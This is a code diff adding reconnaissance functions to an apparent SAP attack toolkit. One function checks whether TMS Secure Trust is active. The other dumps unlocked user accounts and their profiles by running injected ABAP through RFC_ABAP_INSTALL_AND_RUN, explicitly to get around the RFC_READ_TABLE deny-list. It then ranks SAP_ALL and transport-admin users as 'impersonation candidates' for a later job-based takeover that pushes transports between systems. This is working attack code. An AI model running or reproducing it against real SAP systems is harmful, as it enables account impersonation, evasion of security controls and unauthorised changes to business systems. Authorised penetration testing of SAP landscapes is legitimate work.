@@ -1300,3 +1300,228 @@ def read_recent_transports(dest: TMSDestination, limit: int = 50,
     except Exception as e:
         out["error"] = f"logon failed: {type(e).__name__}: {str(e)[:200]}"
     return out
+
+
+# ============================================================================
+# STMS Secure-Trust recon (Phase 0)
+# ============================================================================
+# When TMSMCONF.SINSON = '1' the target's tp binary refuses transport
+# imports unless the CALLING user (from source) also exists in the
+# target's client 000 with the same name.  This means TMSADM alone
+# is not enough for the actual import step — we need to invoke the
+# import FM AS a user that lives on both systems.
+#
+# These helpers do the discovery half of that solution:
+#   1. Read TMSMCONF.SINSON on the source's domain — is Secure Trust on?
+#   2. Enumerate USR02 candidates on the source (filtered + ranked)
+#      so the operator can pick one for the impersonation test.
+# The actual impersonation-and-test (XBP job as candidate user) lives
+# in sap_tms_propagate.py — recon lives here because it's read-only
+# and reuses probe infrastructure.
+
+def read_secure_trust_state(source_node, source_domain: str,
+                              source_sid: str,
+                              creds: Credentials = None) -> dict:
+    """Return ``{ok, sinson_active, error}`` — reads TMSMCONF.SINSON
+    on the source's domain-controller row (the DOMCTL='X' row).
+    Verified live on TWT: field ``SINSON`` (position 18, CHAR 1),
+    value '1' = Trusted Services active, ' ' = off.
+    """
+    out = {"ok": False, "sinson_active": False, "error": ""}
+    try:
+        from sapmap_rfc import _get_connection
+        from sapmap_errors import format_rfc_exception
+    except Exception as e:
+        out["error"] = f"sapmap_rfc import failed: {e}"
+        return out
+    try:
+        with _get_connection(source_node, creds) as conn:
+            rows_raw, _flag, err = _rfc_read_table(
+                conn, "TMSMCONF",
+                ["DOMNAM", "SYSNAM", "SINSON"],
+                rowcount=50,
+                where=[f"DOMNAM = '{source_domain}'"])
+            if err:
+                out["error"] = f"TMSMCONF read: {format_rfc_exception(err)}"
+                return out
+            for r in rows_raw:
+                p = _parse_wa_row(r, ["DOMNAM", "SYSNAM", "SINSON"])
+                if not p:
+                    continue
+                # Any row in the domain that says SINSON='1' means
+                # Trusted Services is enabled — the flag is a
+                # domain-wide setting, so the first hit suffices.
+                if (p.get("SINSON") or "").strip() == "1":
+                    out["sinson_active"] = True
+                    print(f"[+] {source_sid}: TMSMCONF SINSON=1 "
+                          f"(domain '{source_domain}' has "
+                          f"Trusted Services / Secure trust ACTIVE)")
+                    break
+            if not out["sinson_active"]:
+                print(f"[i] {source_sid}: TMSMCONF SINSON!='1' "
+                      f"(domain '{source_domain}' Secure trust OFF)")
+            out["ok"] = True
+    except Exception as e:
+        out["error"] = (f"read_secure_trust_state failed: "
+                         f"{type(e).__name__}: {str(e)[:200]}")
+    return out
+
+
+# Users we always exclude from the candidate list — either always
+# locked (SAP*, DDIC), or reserved for RFC/system use where
+# impersonation via XBP job wouldn't make sense (they can't hold
+# the substitution because kernel-owned or the target sees them as
+# service-only).  SAPMAP-family users are DELIBERATELY NOT excluded
+# even though they start with 'SAP' — the operator may want to test
+# with their own created user.
+_IMPERSONATION_ALWAYS_EXCLUDE = {
+    "SAP*", "DDIC", "TMSADM", "EARLYWATCH", "SAPCPIC", "SAPSYS",
+    "SAPADM",
+}
+
+
+def enumerate_impersonation_candidates(source_node,
+                                          source_client: str,
+                                          creds: Credentials = None,
+                                          limit: int = 200) -> dict:
+    """Return ``{ok, candidates: [...], error}`` — reads USR02 on
+    ``source_client`` filtered to non-locked usable users, enriches
+    with UST04 profile assignments, and ranks by likely-to-work-
+    cross-domain (SAP_ALL first, then transport-admin profiles,
+    then rest by last-login date).
+
+    USR02 is on the RFC_READ_TABLE deny-list on modern S/4 so we
+    use the RFC_ABAP_INSTALL_AND_RUN + SELECT pattern (compiled
+    ABAP program that runs SELECT locally, avoiding the deny-list).
+
+    Each candidate dict:
+      {bname, ustyp, uflag, trdat, profiles: [str], rank: int}
+    """
+    out = {"ok": False, "candidates": [], "error": ""}
+    try:
+        from sapmap_rfc import _get_connection
+    except Exception as e:
+        out["error"] = f"sapmap_rfc import failed: {e}"
+        return out
+
+    # Combined ABAP program — one RFC_ABAP_INSTALL_AND_RUN call does
+    # BOTH the USR02 candidate SELECT and the UST04 profile-enrichment
+    # SELECT.  Doing them as two separate RFC calls (even on fresh
+    # connections) reliably triggered CM_NO_DATA_RECEIVED on the
+    # second invocation — the SAP server appears to serialize these
+    # aggressively per session/user.  A single program with two
+    # SELECT+LOOP blocks sidesteps the issue entirely and is faster.
+    abap = [
+        "REPORT zsapm_usr02.",
+        "DATA: BEGIN OF ls_u,",
+        "        bname TYPE usr02-bname,",
+        "        ustyp TYPE usr02-ustyp,",
+        "        uflag TYPE usr02-uflag,",
+        "        trdat TYPE usr02-trdat,",
+        "      END OF ls_u.",
+        "DATA lt_u LIKE STANDARD TABLE OF ls_u.",
+        "DATA: BEGIN OF ls_p,",
+        "        bname   TYPE ust04-bname,",
+        "        profile TYPE ust04-profile,",
+        "      END OF ls_p.",
+        "DATA lt_p LIKE STANDARD TABLE OF ls_p.",
+        # 1st SELECT: candidate BNAMEs (broad filter)
+        "SELECT bname ustyp uflag trdat",
+        "  FROM usr02",
+        "  INTO TABLE lt_u",
+        f"  UP TO {int(limit)} ROWS",
+        "  WHERE uflag = 0",
+        "    AND ustyp IN ('A','B','S').",
+        # 2nd SELECT: all their profile assignments in one shot
+        "SELECT bname profile",
+        "  FROM ust04",
+        "  INTO TABLE lt_p",
+        "  FOR ALL ENTRIES IN lt_u",
+        "  WHERE bname = lt_u-bname.",
+        # Dump both, with a marker line separating sections
+        "WRITE: / 'SECTION=USR02'.",
+        "LOOP AT lt_u INTO ls_u.",
+        "  WRITE: / ls_u-bname, '|', ls_u-ustyp, '|',",
+        "         ls_u-uflag, '|', ls_u-trdat.",
+        "ENDLOOP.",
+        "WRITE: / 'SECTION=UST04'.",
+        "LOOP AT lt_p INTO ls_p.",
+        "  WRITE: / ls_p-bname, '|', ls_p-profile.",
+        "ENDLOOP.",
+    ]
+
+    users = []
+    prof_by_user = {}
+    try:
+        with _get_connection(source_node, creds) as conn:
+            r = conn.call("RFC_ABAP_INSTALL_AND_RUN",
+                           PROGRAMNAME="ZSAPM_USR02",
+                           MODE="F",
+                           PROGRAM=[{"LINE": l} for l in abap])
+            err_msg = (r.get("ERRORMESSAGE") or "").strip()
+            if err_msg:
+                out["error"] = f"USR02/UST04 SELECT failed: {err_msg}"
+                return out
+            section = ""
+            for row in (r.get("WRITES") or []):
+                line = (row.get("ZEILE", "") or row.get("LINE", "")
+                        or row.get("WA", "")).strip()
+                if not line:
+                    continue
+                if line.startswith("SECTION="):
+                    section = line.split("=", 1)[1].strip()
+                    continue
+                parts = [p.strip() for p in line.split("|")]
+                if section == "USR02" and len(parts) >= 4:
+                    bname = parts[0].strip()
+                    if not bname or bname in _IMPERSONATION_ALWAYS_EXCLUDE:
+                        continue
+                    if (bname.upper().startswith("SAP")
+                            and not bname.upper().startswith("SAPMAP")):
+                        continue
+                    users.append({
+                        "bname":    bname,
+                        "ustyp":    parts[1].strip(),
+                        "uflag":    parts[2].strip(),
+                        "trdat":    parts[3].strip(),
+                        "profiles": [],
+                        "rank":     20,
+                    })
+                elif section == "UST04" and len(parts) >= 2:
+                    bname = parts[0].strip()
+                    profile = parts[1].strip()
+                    if bname and profile:
+                        prof_by_user.setdefault(bname, []).append(profile)
+    except Exception as e:
+        out["error"] = (f"enumerate USR02/UST04 failed: "
+                         f"{type(e).__name__}: {str(e)[:200]}")
+        return out
+
+    if not users:
+        out["ok"] = True
+        return out
+
+    _TRANSPORT_PROFILES = ("SAP_BC_TRANSPORT_ADMINISTRATOR",
+                             "SAP_BC_CTS_ADMINISTRATOR",
+                             "SAP_BC_CTS_DISPLAY",
+                             "S_A.TMSADM")
+    for u in users:
+        profs = prof_by_user.get(u["bname"], [])
+        u["profiles"] = profs
+        if "SAP_ALL" in profs:
+            u["rank"] = 100
+        elif any(p in profs for p in _TRANSPORT_PROFILES):
+            u["rank"] = 80
+        elif "SAP_NEW" in profs:
+            u["rank"] = 40
+        else:
+            u["rank"] = 20
+
+    users.sort(key=lambda u: (-u["rank"], u.get("trdat", "") or "",
+                                u["bname"]))
+    out["candidates"] = users
+    out["ok"] = True
+    print(f"[+] {source_node.sid}: {len(users)} impersonation candidate(s) "
+          f"— top: "
+          + ", ".join(f"{u['bname']}(r={u['rank']})" for u in users[:5]))
+    return out
